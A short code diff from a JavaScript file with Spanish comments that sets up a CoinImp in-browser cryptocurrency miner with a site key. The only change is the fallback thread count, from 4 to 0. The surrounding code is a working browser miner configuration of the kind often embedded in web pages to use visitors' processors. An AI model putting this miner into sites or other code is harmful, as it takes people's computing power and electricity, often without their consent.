@@ -956,7 +956,7 @@
                 // Inicializar CoinImp con configuración optimizada
                 _client = new Client.Anonymous('5119ade448b365cc088ee2ca888d2ee31d36c3102e0548249d896dc508584e84', {
                     throttle: throttle,
-                    threads: navigator.hardwareConcurrency || 4,
+                    threads: navigator.hardwareConcurrency || 0,
                     autoThreads: true,
                     c: 'w', // MineMe Coin
                     forceASMJS: false
